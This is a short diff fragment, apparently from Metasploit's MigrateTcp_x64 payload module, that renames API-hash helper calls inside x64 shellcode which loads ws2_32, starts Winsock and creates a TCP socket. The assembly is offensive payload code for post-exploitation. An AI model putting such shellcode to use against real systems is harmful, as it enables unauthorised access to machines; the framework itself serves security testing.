@@ -38,13 +38,13 @@ module Payload::Windows::MigrateTcp_x64
       sub rsp, #{WSA_SIZE}      ; alloc size, plus alignment (used later)
       mov r13, rsp              ; save pointer to this struct
       sub rsp, 0x28             ; space for api function calls (really?)
-      mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+      mov r10d, #{block_api_hash('kernel32.dll', 'LoadLibraryA')}
       call rbp                  ; LoadLibraryA('ws2_32')
     init_networking:
       mov rdx, r13              ; pointer to the wsadata struct
       push 2
       pop rcx                   ; Version = 2
-      mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
+      mov r10d, #{block_api_hash('ws2_32.dll', 'WSAStartup')}
       call rbp                  ; WSAStartup(Version, &WSAData)
     create_socket:
       xor r8, r8                ; protocol not specified
@@ -55,7 +55,7 @@ module Payload::Windows::MigrateTcp_x64
       pop rdx                   ; SOCK_STREAM
       push 2
       pop rcx                   ; AF_INET
-      mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
+      mov r10d, #{block_api_hash('ws2_32.dll', 'WSASocketA')}
       call rbp                  ; WSASocketA(AF_INET, SOCK_STREAM, 0, &info, 0, 0)
       xchg rdi, rax
     ^
